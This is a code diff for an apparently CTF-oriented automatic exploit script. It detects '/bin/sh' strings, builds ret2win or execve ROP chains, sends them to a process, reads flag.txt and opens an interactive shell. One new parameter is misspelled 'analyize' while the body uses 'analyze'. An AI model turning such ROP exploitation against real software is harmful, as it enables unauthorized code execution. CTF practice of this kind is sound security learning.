@@ -24,7 +24,7 @@ MM88MMM ,adPPYYba, 8b,dPPYba, MM88MMM
 def check_vuln_type(binary):
     properties = {} 
     if binary.has_binsh():
-        print("[+]String of interest: 'binsh' present")
+        print("[+] String of interest: 'binsh' present")
         properties["binsh"] = True
     else:
         properties["binsh"] = False
@@ -91,12 +91,12 @@ def check_vuln_type(binary):
 
     return properties
 
-def exploit(binary, properties):
-
+def exploit(analyize, properties):
+    binary = analyze.binary
     p = process(binary)
     payload = None
     
-    rop = Fart_ROP.ROP(binary, properties)
+    rop = Fart_ROP.ROP(analyze, properties)
     if properties["win"]:
         payload = rop.ret2win()
     elif properties["execve"]:
@@ -105,6 +105,7 @@ def exploit(binary, properties):
     if payload:
         p.sendline(payload)
         if properties["binsh"]:
+            sleep(0.1)
             p.sendline(b"cat flag.txt")
         p.interactive()
         print("\U0001F525"*30)
@@ -119,4 +120,4 @@ if __name__ == "__main__":
     
     analyze = Analyze(binary)
     properties = check_vuln_type(analyze)
-    exploit(binary, properties)
+    exploit(analyze, properties)
